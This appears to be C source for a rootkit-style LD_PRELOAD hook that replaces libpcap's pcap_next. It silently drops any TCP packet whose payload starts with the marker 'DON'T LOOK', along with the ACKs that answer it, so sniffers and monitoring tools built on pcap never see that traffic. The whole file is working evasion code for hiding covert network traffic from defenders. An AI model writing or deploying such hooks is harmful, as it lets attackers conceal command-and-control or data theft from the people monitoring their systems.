#include "frame_analysis.h"
#include "ack_ds.h"
#include <netinet/tcp.h>
#include <dlfcn.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>

#ifndef likely
#define likely(x)       __builtin_expect(!!(x), 1)
#endif
#ifndef unlikely
#define unlikely(x)     __builtin_expect(!!(x), 0)
#endif

static u_char *(*og_pacp_next)(pcap_t *, struct pcap_pkthdr *) = NULL;
static char secret_prefix[] = "DON'T LOOK";
static ack_ds ack_ds_handle = NULL;


const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
{
    u_char *packet;
    u_char *payload;
    u_int payload_len;
    struct tcphdr *tcp_hdr;
    u_char should_hide = 0;

    if (!og_pacp_next)
    {
        og_pacp_next = dlsym(RTLD_NEXT, "pcap_next");
        if (!og_pacp_next)
        {
            fprintf(stderr, "Error in dlysm: %s\n", dlerror());
            exit(1);
        }
    }
    packet = og_pacp_next(p, h);

    if (!(tcp_hdr = find_tcp_segment(packet, h->len))) 
    {
        // Not TCP
        return packet;
    }

    if (likely(tcp_hdr->ack))
        if ((should_hide = is_ack_kept(ack_ds_handle, tcp_hdr->th_sport, tcp_hdr->th_dport, tcp_hdr->ack_seq)))
            remove_ack(&ack_ds_handle, tcp_hdr->th_sport, tcp_hdr->th_dport, tcp_hdr->ack_seq);

    if (!(payload = get_tcp_payload(tcp_hdr)))
        goto return_result;


    payload_len = packet + h->len - payload;
    if ((should_hide = (payload_len && strncmp((char *)payload, secret_prefix, sizeof(secret_prefix) - 1) == 0)))
    {
        add_ack(&ack_ds_handle, tcp_hdr->th_dport, tcp_hdr->th_sport, tcp_hdr->seq + payload_len);
    }


return_result:

    if (should_hide)
        return pcap_next(p, h);
    return packet;

}


